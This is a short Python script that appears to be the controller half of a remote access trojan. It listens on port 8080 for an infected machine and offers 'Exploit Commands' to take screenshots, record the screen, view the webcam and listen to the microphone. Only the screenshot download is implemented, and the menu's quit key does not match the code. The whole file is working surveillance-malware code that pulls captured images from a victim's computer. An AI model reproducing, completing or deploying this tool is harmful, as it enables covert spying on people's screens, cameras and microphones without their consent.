#!/usr/bin/env python3
import socket 
import sys
import os
from datetime import datetime

host = socket.gethostbyname("") 
port = 8080
sock = None
conn = None

def create_server():
    try:
        global sock
        sock = socket.socket()
        print("Server started on " + host)
    except socket.error as msg:
        print("Socket Creation ERROR: " + str(msg))

def bind_socket():
    try:
        print("Binding the Port " + str(port))

        sock.bind((host, port))
        sock.listen(5)
    except socket.error as msg:
        print("Socket Binding error " + str(msg) + "\n" + "Retrying...")
        bind_socket()

def socket_accept():
    global conn
    conn, addr = sock.accept()

    print("\nConnection has been established | " + " IP " + addr[0] + " | Port " + str(addr[1]))
    print("WARNING: Type '--help' for usage information.\n")
    
    send_commands()

def show_usage():
    print("### Exploit Commands ###\n")
    print("[S] Take a screenshot")
    print("[R] Show screen recording")
    print("[W] View webcam")
    print("[M] Listen mic")
    print("[Q] Quit script")

def send_commands():
    cmd = input("$ ")

    if cmd == "--help" or cmd == "h":
        show_usage()
    elif cmd == "S" or cmd == "s":
        conn.send(cmd.encode())
        download_file(conn)
    elif cmd == "X" or cmd == "x":
        sock.close()
        sys.exit()
    else:
        print("Unknown command. Try Again!")
    
    send_commands()

def download_file(conn):
    print("\nColecting Screenshot...")
    data = conn.recv(1024)
    filesize = data.decode()

    date = datetime.now()
    str_date = date.strftime("%d-%m-%Y %H'%M'%S")

    filename = "Screenshot_" + str_date    
    path = filename + ".png"

    print("Creating File...Alocating memory...")

    f = open(filename + ".png", 'wb')

    data = conn.recv(1024)
    totalRecv = len(data)
    f.write(data)
    
    while totalRecv < float(filesize):
        data = conn.recv(1024)
        totalRecv += len(data)
        f.write(data)
        print("{0:.2f}".format((totalRecv/float(filesize)) * 100) + \
                "% Done...", end = "\r")
        conn.send("Downloading".encode('utf-8'))

    print("\nScreenshot received!\n")
    conn.send("Download Finished!".encode('utf-8'))

if __name__ == '__main__':
    create_server()
    bind_socket()
    socket_accept()
